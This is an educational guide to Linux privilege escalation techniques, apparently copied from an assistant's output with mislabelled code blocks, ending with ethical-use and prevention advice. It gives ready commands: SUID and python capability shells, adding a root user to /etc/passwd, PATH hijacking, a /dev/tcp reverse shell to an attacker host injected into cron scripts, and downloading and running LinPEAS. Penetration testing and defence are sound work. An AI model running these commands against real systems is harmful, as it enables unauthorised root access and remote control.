Privilege escalation in Linux refers to gaining higher levels of access or permissions (e.g., root access) than the system's intended configuration allows. This can be achieved by exploiting misconfigurations, vulnerabilities, or design flaws in the system.

Below is a detailed guide on privilege escalation techniques in Linux:

1. Basic Enumeration
Before attempting privilege escalation, thorough system enumeration is crucial. Use the following commands to gather information:

System Information
uname -a: Kernel version and system details.
cat /etc/*release: Distribution details.
User Information
whoami: Current user.
id: Groups and privileges of the current user.
who: Logged-in users.
Files and Permissions
ls -la: List file permissions.
find / -perm -4000 2>/dev/null: Look for SUID binaries.
Network Information
ifconfig or ip addr: Network configuration.
netstat -tuln or ss -tuln: Listening ports.
Processes
ps aux: Running processes.
crontab -l: Scheduled tasks.
2. Kernel Exploits
Outdated kernels are a common target for privilege escalation. If the system is running an old kernel version, search for known vulnerabilities.

Steps:
Check the kernel version:

bash
Copy code
uname -r
Search for exploits:

Use online databases like Exploit-DB.
Tools: searchsploit (part of Kali Linux).
Compile and run the exploit:

Transfer the exploit to the target system.
Compile it (if needed):
Copy code
gcc exploit.c -o exploit
Execute:
bash
Copy code
./exploit
3. SUID Binary Exploitation
Files with the SUID bit set run with elevated privileges. If a SUID binary is misconfigured, it can be exploited.

Steps:
Find SUID binaries:
typescript
Copy code
find / -perm -u=s -type f 2>/dev/null
Check for exploitable binaries:
Look for common misconfigurations or custom binaries.
Example: vim, find, cp, etc.
Exploit:
For example, if find has SUID:
bash
Copy code
find . -exec /bin/sh -p \; -quit
4. Weak File Permissions
Misconfigured permissions on sensitive files can lead to privilege escalation.

Steps:
Check /etc/passwd or /etc/shadow:

If writable, modify /etc/passwd to add a new user with root privileges.
bash
Copy code
echo 'root2:x:0:0::/root:/bin/bash' >> /etc/passwd
su root2
If /etc/shadow is accessible, use tools like John the Ripper to crack hashes.
Writable system files or scripts:

Look for writable files in /usr/bin/, /etc/cron.d/, etc.
Modify scripts to include malicious code (e.g., reverse shell).
5. Exploiting Cron Jobs
If the target system runs cron jobs with elevated privileges, they can be exploited.

Steps:
Check for cron jobs:
bash
Copy code
crontab -l
cat /etc/crontab
Look for writable scripts or files executed by cron.
Inject malicious commands:
bash
Copy code
echo 'bash -i >& /dev/tcp/attacker_ip/attacker_port 0>&1' > /path/to/script
6. Exploiting Writable PATH
If a privileged user runs a script or command without specifying the full path, and the current user can write to the PATH variable, a malicious binary can be placed in the PATH.

Steps:
Check the PATH variable:
bash
Copy code
echo $PATH
Place a malicious script in a writable directory:
bash
Copy code
echo "/bin/bash" > /tmp/ls
chmod +x /tmp/ls
Execute the script:
bash
Copy code
PATH=/tmp:$PATH
ls
7. Exploiting NFS (Network File System)
If NFS is configured incorrectly, it can be exploited to gain root access.

Steps:
Check for NFS shares:
Copy code
showmount -e target_ip
Mount the share:
bash
Copy code
mount target_ip:/share /mnt
If no_root_squash is enabled, create a SUID binary in the mounted directory.
8. Exploiting Capabilities
Linux capabilities can allow binaries to perform specific privileged operations.

Steps:
Find binaries with capabilities:
javascript
Copy code
getcap -r / 2>/dev/null
Exploit capabilities:
For example, if /usr/bin/python has cap_setuid:
rust
Copy code
python -c 'import os; os.setuid(0); os.system("/bin/bash")'
9. Password Reuse and Misconfigurations
Sometimes, privilege escalation can be achieved without technical exploits:

Check for reused passwords.
Use the current user’s credentials to access sensitive files or services.
10. Tools for Linux Privilege Escalation
LinPEAS:

A script for automated privilege escalation checks.
bash
Copy code
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
Linux Exploit Suggester:

Suggests possible exploits for the target system.
Copy code
perl les.pl
GTFOBins:

A database of SUID and sudo misconfigurations.
Ethical Use and Prevention
Ethical Use:

Conduct privilege escalation only with explicit permission during penetration tests or authorized security assessments.
Prevention:

Regularly update the system and software.
Enforce the principle of least privilege (PoLP).
Audit and monitor user accounts, permissions, and cron jobs.
Use strong authentication mechanisms.
Restrict SUID and GUID binaries.